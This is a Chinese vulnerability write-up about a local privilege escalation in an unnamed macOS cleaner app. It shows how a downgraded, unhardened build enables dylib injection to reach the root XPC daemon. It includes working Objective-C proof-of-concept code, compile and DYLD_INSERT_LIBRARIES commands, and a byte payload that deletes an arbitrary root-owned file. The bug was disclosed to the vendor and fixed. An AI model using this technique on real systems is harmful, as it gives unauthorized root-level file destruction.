> 原文链接: https://www.anquanke.com//post/id/213488 


# 一次对某厂商MacOS客户端软件本地提权漏洞的挖掘与利用


                                阅读量   
                                **169899**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01cea48764f89c39f8.jpg)](https://p2.ssl.qhimg.com/t01cea48764f89c39f8.jpg)



作者：[houjingyi](https://houjingyi233.com/)`[@360CERT](https://github.com/360CERT)`

MacOS客户端软件中经常出现开发者使用XPC没有正确进行验证导致的本地提权漏洞。其实这个漏洞也是无意发现的，因为自己本来也在用这个软件，所以顺手就审计了一下。

首先这个软件是一个垃圾清理软件，注意到后台有一个root权限运行的daemon进程，那么我们直接IDA反编译，找到shouldAcceptNewConnection函数。

[![](https://p0.ssl.qhimg.com/t01bccfb857005cba5f.jpg)](https://p0.ssl.qhimg.com/t01bccfb857005cba5f.jpg)

开发者还是有一定安全意识的，似乎这里看起来没有什么问题，用codesign检查了程序的签名，所有可执行文件flags=0x10000，无法进行dylib注入。官网上下载链接是`www.xxxx.com/xxx_4.4.0.dmg`，我直接把下载链接改成`www.xxxx.com/xxx_1.1.0.dmg`，下载到了一个非常老的版本，在这个版本中找到了一个flags=0x0的可执行文件，也就是说我们可以dylib注入到这个版本的可执行文件然后与daemon进程通信，这样就绕过了验证，可以调用daemon进程导出的函数。

class-dump一下：

[![](https://p3.ssl.qhimg.com/t012cd3591c4e3de51f.jpg)](https://p3.ssl.qhimg.com/t012cd3591c4e3de51f.jpg)

我们先来试试能不能调用导出的buildXPCConnectChannel函数，因为这个函数没有参数，比较简单。在IDA中可以看到该函数会打印一个log：

[![](https://p1.ssl.qhimg.com/t012ee2e360d4c248b0.jpg)](https://p1.ssl.qhimg.com/t012ee2e360d4c248b0.jpg)

代码大概是下面这样的：

```
#import &lt;Foundation/Foundation.h&gt;

static NSString* kXPCHelperMachServiceName = @"xxx";

@protocol xxxDaemonXPCProtocol &lt;NSObject&gt;
- (void)sendDataToDaemon:(NSData *)arg1 withReply:(void (^)(NSData *))arg2;
- (void)buildXPCConnectChannel;
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv)
`{`

    NSString*  _serviceName = kXPCHelperMachServiceName;

    NSLog(@"test");

    NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
    [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(xxxDaemonXPCProtocol)]];
    [_agentConnection resume];

    [_agentConnection.remoteObjectProxy buildXPCConnectChannel]; 

    NSLog(@"Done!");

    return;
`}`
```

编译：

`gcc -dynamiclib -framework Foundation poc.m -o poc.dylib`

运行：

`DYLD_INSERT_LIBRARIES=poc.dylib /Users/hjy/Downloads/xxx`

看一下系统日志：

[![](https://p4.ssl.qhimg.com/t015f9511c535b8366a.png)](https://p4.ssl.qhimg.com/t015f9511c535b8366a.png)

接下来我们想要证明这个漏洞是有实际危害的，通过前面class-dump的结果可以知道还有一个sendDataToDaemon的导出函数，在IDA中看到这个函数调用了cmdDispather函数：

[![](https://p2.ssl.qhimg.com/t010561d7bdb5015832.jpg)](https://p2.ssl.qhimg.com/t010561d7bdb5015832.jpg)

在cmdDispather函数中基本上就可以用root权限做任何事情了：

[![](https://p3.ssl.qhimg.com/t019425cead8d31eb5f.jpg)](https://p3.ssl.qhimg.com/t019425cead8d31eb5f.jpg)

为了省事，我决定编写一个能够删除任意文件的POC。我可以通过调试程序下断点的方法去弄清楚这里的参数是什么，因为一开始就说了这是一个垃圾清理软件，当我用垃圾清理或者程序删除之类的功能去删除root用户文件的时候前台进程是没有权限删除的，它肯定是调用sendDataToDaemon函数把消息发给daemon进程让daemon进程去删的，所以调试程序触发断点很方便。

最后，我大概搞清楚了这里参数是怎么组成的：首先有4个byte表示总长度，接下来有几个含义未知但是不会变的byte，然后又有4个byte表示剩余部分的长度，接下来是当前用户名和要删除的文件名(ASCII)，最后又有几个含义未知但是不会变的byte。

成功编写出的删除任意文件的POC大概是下面这样的，这个POC能够使得普通用户houjingyi1996删除root用户文件/opt/cisco/anyconnect/ACManifestVPN.xml。

```
#import &lt;mach-o/dyld.h&gt;
#import &lt;Foundation/Foundation.h&gt;

static NSString* kXPCHelperMachServiceName = @"xxx";

@protocol xxxDaemonXPCProtocol &lt;NSObject&gt;
- (void)sendDataToDaemon:(NSData *)arg1 withReply:(void (^)(NSData *))arg2;
- (void)buildXPCConnectChannel;
@end

__attribute__((constructor))
static void customConstructor(int argc, const char **argv)
`{`

    NSString*  _serviceName = kXPCHelperMachServiceName;

    Byte byte[] = `{`0x4d, 0x00, 0x00, 0x00, 0x46, 0x1f, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, \
                   0x36, 0x00, 0x00, 0x00, 0x68, 0x6f, 0x75, 0x6a, 0x69, 0x6e, 0x67, 0x79, 0x69, 0x31, 0x39, 0x39, \
                   0x36, 0x00, 0x2f, 0x6f, 0x70, 0x74, 0x2f, 0x63, 0x69, 0x73, 0x63, 0x6f, 0x2f, 0x61, 0x6e, 0x79, \
                   0x63, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x2f, 0x41, 0x43, 0x4d, 0x61, 0x6e, 0x69, 0x66, 0x65, \
                   0x73, 0x74, 0x56, 0x50, 0x4e, 0x2e, 0x78, 0x6d, 0x6c, 0x00, 0x00, 0x00, 0x01`}`;

    //0x4d, 0x00, 0x00, 0x00 总长度
    //0x46, 0x1f, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00 含义未知
    //0x36, 0x00, 0x00, 0x00 应该是剩余部分的长度(不算最后的0x00, 0x00和0x01)
    //0x68, 0x6f, 0x75, 0x6a, 0x69, 0x6e, 0x67, 0x79, 0x69, 0x31, 0x39, 0x39, 0x36 用户名(ASCII)
    //剩下的部分是文件名, 这里是/opt/cisco/anyconnect/ACManifestVPN.xml(ASCII)
    //0x00, 0x00, 0x01 最后这三个字节，含义未知

    NSData *arg1 = [[NSData alloc]initWithBytes:byte length:77];

    NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
    [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(xxxDaemonXPCProtocol)]];
    [_agentConnection resume];

    [_agentConnection.remoteObjectProxy buildXPCConnectChannel]; 

    [[_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error) `{`
        (void)error;
        NSLog(@"Failure");
    `}`]sendDataToDaemon:arg1 withReply:^(NSData * err)
    `{`
        NSLog(@"Success");   
    `}`];
    NSLog(@"Done!");

    return;
`}`
```

我向厂商提交了POC和演示视频之后厂商很快确认并修复了漏洞。修复方法也很简单，再检查一下程序的版本号就可以了。

[![](https://p4.ssl.qhimg.com/t01f8ef8e0fa899785d.jpg)](https://p4.ssl.qhimg.com/t01f8ef8e0fa899785d.jpg)



## 最后

1.编写的程序如果需要在高权限下运行或者导出了危险的接口，必须经过仔细的审计。<br>
2.和windows系统上的dll注入一样，厂商往往会不太注意dylib注入这样的问题，然而在一些场景下dll/dylib注入可能会导致非常严重的后果。
